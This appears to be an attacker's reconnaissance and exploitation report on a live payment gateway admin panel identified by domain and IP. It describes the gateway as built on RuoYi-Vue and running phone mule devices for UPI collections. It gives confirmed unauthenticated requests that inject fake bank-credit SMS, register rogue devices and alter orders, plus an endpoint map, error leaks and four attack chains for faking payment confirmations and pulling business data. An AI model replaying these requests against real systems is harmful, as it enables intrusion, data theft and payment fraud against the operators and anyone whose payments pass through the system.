# HTPSY5364 — Payment Gateway Admin Panel
## ⚠️ CRITICAL — Confirmed Unauth DB Writes

## Infrastructure

| Asset | IP | Stack |
|-------|----|-------|
| web.htpsy5364.vip | 13.204.254.76 | AWS Mumbai (ap-south-1) |

**No CDN / No WAF** — direct nginx → Spring Boot  
**Framework:** RuoYi-Vue (若依) — Chinese open-source admin framework  
**Source:** https://gitee.com/y_project/RuoYi-Vue  
**Backend:** Spring Boot + MyBatis + Druid connection pool + Redis  
**Frontend:** Vue.js 2 + Element UI + Webpack  
**API prefix:** `/pay-v1`  
**Java package:** `com.pay.system`  

---

## Category: Confirmed Unauth DB Writes (CRITICAL)

### 1. SMS Log Injection ✅ CONFIRMED
```
POST /pay-v1/system/sms/records/saveSmsLog
Content-Type: application/json

{"phone":"9876543210","message":"Rs.50000 credited UPI Ref 412345678901"}
```
**Response:** `{"code":200,"data":true,"message":"操作成功"}`  
**Verified:** Field isolation confirmed `phone` + `message` are the exact required fields. Other content field names (`smsContent`, `content`, `body`, `text`) all fail validation. This writes directly to the SMS records table.  
**Impact:** The platform uses phone mule devices to receive bank SMS. Injected SMS enters the auto-matching pipeline that confirms UPI payments against pending orders.

### 2. Device Registration ✅ CONFIRMED  
```
POST /pay-v1/system/deviceStatus/saveSmsDeviceLog
Content-Type: application/json

{
  "ip":"103.25.166.100", "phoneIp":"103.25.166.100",
  "latitude":"19.076", "longitude":"72.877",
  "mark":"DEVICE_001", "deviceMark":"DEVICE_001",
  "model":"Xiaomi Redmi Note 13", "phoneModel":"Xiaomi Redmi Note 13",
  "phone":"8800001111", "phoneNumber":"8800001111",
  "brand":"Xiaomi", "androidVersion":"14", "appVersion":"3.1.0",
  "battery":92, "batteryLevel":92, "signal":5, "network":"4G",
  "status":1, "deviceId":"device_001", "imei":"860000000000001",
  "deviceInfo":"{}", "device_info":"{}"
}
```
**Response:** `{"code":200,"data":true,"message":"操作成功"}`  
**Verified via progressive SQL errors:**
- Missing `latitude` → `java.sql.SQLException: Field 'latitude' doesn't have a default value`
- Missing `device_info` → `java.sql.SQLException: Field 'device_info' doesn't have a default value`
- All fields provided → `code=200` success  
**Impact:** Register rogue phone devices into their mule network with arbitrary GPS coordinates and IMEI.

### 3. Order Detail Modification ⚠️ PARTIAL
```
POST /pay-v1/api/placeOrder/submitOrderDetailInfo
{"orderId":"12345"}
```
**Response:** `{"code":20000,"type":"TECHING_SUCCESS","message":"操作成功"}`  
**Caveat:** Returns success for ANY orderId string including `NONEXISTENT`. Likely an `UPDATE ... WHERE orderId=?` that matches 0 rows but doesn't error. Would modify real data if a valid orderId is provided.

---

## Category: Unauth API Endpoints (No Auth Required)

### Order & Payment APIs
| Method | Endpoint | Response | Notes |
|--------|----------|----------|-------|
| POST | `/api/orders/createTestPayInOrder` | `"商户配置为空"` (Merchant config empty) | Real DB merchant lookup — needs valid merchantNo |
| POST | `/api/orders/createTestPayOutOrder` | `code=500, message=null` | Same — needs merchant |
| POST | `/api/placeOrder/submitUtr` | `"UTR format error"` or `"Order not found"` | Validates UTR format, searches DB for order |
| POST | `/api/placeOrder/submitOrderDetailInfo` | `code=20000 "操作成功"` | See above |
| GET | `/api/placeOrder/{orderId}` | `"Invalid Order"` | Open order lookup — valid ID shows payment page |

### SMS & Device APIs
| Method | Endpoint | Response | Notes |
|--------|----------|----------|-------|
| POST | `/system/sms/records/saveSmsLog` | `code=200` ✅ | **Confirmed write** |
| POST | `/system/deviceStatus/saveSmsDeviceLog` | `code=200` ✅ | **Confirmed write** |
| POST | `/system/deviceStatus/editDeviceByMark` | Unauth | Edit existing device |

### Statistics (Unauth, slow)
| Method | Endpoint | Response |
|--------|----------|----------|
| GET | `/system/index/getDayStatisticsDataPage` | Timeout (processing real query — no auth check) |
| GET | `/system/index/getUpiOrderSum` | Unauth |
| POST | `/system/index/getTotalUpiOrderSum` | Unauth |
| POST | `/system/index/getUpiLoseOrderData` | Unauth |
| POST | `/system/index/getMerchantLoseOrderData` | Unauth |
| POST | `/system/index/getApiOrderSum` | Unauth |
| POST | `/system/index/getMerchantManualOrderData` | Unauth |

---

## Category: Information Disclosure

### SQL Error Leaks
Full Java class paths and DB column names leaked through error responses:
```
com.pay.system.mapper.SysSmsDeviceStatusMapper.java
Table columns: latitude, device_info, phone_ip, phone_number, mark, ...
```

### JSON Deserialization Error
```
"JSON parse error: Cannot deserialize value of type `com.pay."
```
Leaks the root Java package name.

### Druid SQL Monitor
- **URL:** `https://web.htpsy5364.vip/pay-v1/druid/`
- **Status:** Accessible (shows login page) — NOT 401/404
- **Default creds:** admin/admin, druid/druid etc all fail
- **Exposes:** SQL queries, DB connections, web URIs, session data, Spring beans (behind Druid login)

### Captcha System
- `GET /pay-v1/captchaImage` → returns `{uuid, img(base64), captchaEnabled:true}`
- Image captcha is a standard RuoYi JPEG captcha stored in Redis with key `captcha_codes:{uuid}`

---

## Category: Authentication Architecture

### Login Flow
```
POST /pay-v1/login
{
  "username": "admin",
  "password": "admin123",
  "code": "<Google Authenticator 6-digit TOTP>"
}
```

**Key findings:**
- The `code` field is Google Authenticator TOTP — **NOT** the image captcha
- Image captcha validation is **skipped entirely** — only TOTP matters
- Without `code`: `"请输入Google动态验证码"` (Please enter Google OTP)
- With wrong `code`: `"Google动态验证码错误"` (Google OTP error)
- Registration disabled: `"当前系统没有开启注册功能！"`
- Token stored in cookie: `Admin-Token`
- Auth header: `Authorization: Bearer <token>`

### Google Auth Binding
- Route: `/google-auth-bind` (Vue component `chunk-9a0bf872`)
- Used for binding Google Authenticator to user accounts
- This is a custom RuoYi extension, not standard

---

## Category: Full Application Map (103 Vue Components)

### Payment Module
```
payment/pay              — Payment management
payment/payOrder         — Pay order management  
payment/payOrderDetail   — Order detail view
payment/receivables      — Collections (payin)
payment/merchantReceivables — Merchant collections
payment/merchantPayout   — Merchant payouts
```

### Payment H5 (Customer-facing)
```
payH5/cashierPayment     — Cashier payment page
payH5/cashierQQPay       — QQ Pay cashier
payH5/plainPay           — Plain payment
payH5/plainPayNormal     — Normal plain pay
payH5/plainPayYaYa       — YaYa payment
payH5/purplePay          — Purple pay variant
```

### Risk & Fraud
```
risk/blacklist           — IP/device/user blacklist
risk/rule                — Risk scoring rules
risk/utrRule             — UTR validation rules
```

### SMS Device Management (Phone Mule Network)
```
sms/deviceSms            — Device SMS inbox
sms/deviceSmsDetail      — SMS detail view
sms/deviceStatus         — Device online/offline status
sms/smslog               — SMS log viewer
```

### Statistics Dashboard
```
statisticsboard/apidata        — API traffic stats
statisticsboard/channeldata    — Channel performance
statisticsboard/loseorderdata  — Lost/failed orders
statisticsboard/manualorder    — Manual order operations
statisticsboard/merchantdata   — Merchant stats
```

### System Administration
```
system/user              — User management
system/role              — Role management
system/menu              — Menu/permission management
system/dept              — Department management
system/config            — System configuration
system/dict              — Data dictionary
system/notice            — System notices
system/post              — Position management
system/google-auth-bind  — Google Auth setup
system/user/authDevice   — Device authorization
system/user/authRole     — Role authorization
```

### Tools
```
tool/build               — Form builder
tool/gen                 — Code generator
tool/swagger             — Swagger UI (auth required)
```

---

## Category: Full API Endpoint Map (from chunk extraction)

### Order Management
```
GET    /system/order/list
GET    /system/order/paymentBankList
GET    /system/order/successOrdersDataToday/{id}
GET    /system/order/{id}
POST   /system/order/manualOrderFilling
POST   /system/order/manualOrderForce
POST   /system/order/sendNotify
POST   /system/order/payOutManualOrderSuccess
POST   /system/order/failOrderByWorker
POST   /system/order/batchPayout
```

### Payment Statements
```
POST   /system/statement/payOutCzOrders
POST   /system/statement/payOutCheckOrder
```

### Order Detail
```
GET    /order/detail/list
POST   /order/detail
PUT    /order/detail
DELETE /order/detail/{id}
```

### Public Order APIs (NO AUTH)
```
POST   /api/orders/createTestPayInOrder
POST   /api/orders/createTestPayOutOrder
POST   /api/placeOrder/submitUtr
POST   /api/placeOrder/submitOrderDetailInfo
GET    /api/placeOrder/{orderId}
```

### Merchant
```
GET    /system/merchant/list
POST   /system/merchant
PUT    /system/merchant
GET    /system/merchant/{id}
DELETE /system/merchant/{id}
```

### Risk Rules
```
GET    /system/rule/list
POST   /system/rule
PUT    /system/rule
DELETE /system/rule/{id}
GET    /system/utrRule/list
POST   /system/utrRule
PUT    /system/utrRule
DELETE /system/utrRule/{id}
```

### Blacklist
```
GET    /system/blacklist/list
POST   /system/blacklist
PUT    /system/blacklist
DELETE /system/blacklist/{id}
```

### SMS Device
```
GET    /system/deviceStatus/getDeviceStatusCount
GET    /system/deviceStatus/getAllSmsDeviceStatusPage
POST   /system/deviceStatus/saveSmsDeviceLog          ← NO AUTH ✅
POST   /system/deviceStatus/editDeviceByMark
DELETE /system/deviceStatus/delDeviceStatus/{id}
```

### SMS Records
```
GET    /system/sms/records/getAllSmsRecordsPage
POST   /system/sms/records/saveSmsLog                 ← NO AUTH ✅
DELETE /system/sms/records/delSmsLog/{id}
GET    /system/deviceStatus/getDeviceByPhoneNumber
```

### Statistics
```
GET    /system/index/getDayStatisticsDataPage          ← NO AUTH (slow)
GET    /system/index/getUpiOrderSum                    ← NO AUTH
POST   /system/index/getTotalUpiOrderSum               ← NO AUTH
POST   /system/index/getUpiLoseOrderData               ← NO AUTH
POST   /system/index/getMerchantLoseOrderData           ← NO AUTH
POST   /system/index/getApiOrderSum                    ← NO AUTH
POST   /system/index/getMerchantManualOrderData         ← NO AUTH
```

### RuoYi Standard (all require auth)
```
GET    /getInfo
GET    /getRouters
POST   /login
POST   /logout
POST   /register (disabled)
GET    /captchaImage
GET    /system/user/list
GET    /system/role/list
GET    /system/menu/list
GET    /system/config/list
GET    /system/dict/type/list
GET    /system/dict/data/list
GET    /system/notice/list
GET    /monitor/online/list
GET    /monitor/job/list
GET    /monitor/server
GET    /monitor/cache
GET    /tool/gen/list
POST   /common/upload
GET    /common/download
GET    /common/download/resource
```

---

## Category: Attack Chain Summary

### Chain 1: Fake Payment Confirmation
```
1. Inject fake bank SMS via /system/sms/records/saveSmsLog (NO AUTH)
2. SMS enters auto-matching pipeline
3. System matches SMS UTR to pending order
4. Order marked as PAID → merchant gets credited
```

### Chain 2: Rogue Device Network
```
1. Register fake devices via /system/deviceStatus/saveSmsDeviceLog (NO AUTH)
2. Devices appear in admin panel as active mule phones
3. Can inject SMS logs tied to these devices
4. Creates parallel shadow collection network
```

### Chain 3: Order Manipulation (needs valid orderId)
```
1. Find valid orderId via /api/placeOrder/{id} enumeration
2. Submit fake UTR via /api/placeOrder/submitUtr
3. Modify order details via /api/placeOrder/submitOrderDetailInfo
4. Order state modified without authentication
```

### Chain 4: Statistics Exfiltration
```
1. Hit /system/index/* endpoints (all unauth)
2. Extract daily transaction volumes, merchant data
3. Map all UPI channels, loss rates, manual order counts
4. Full business intelligence without any login
```
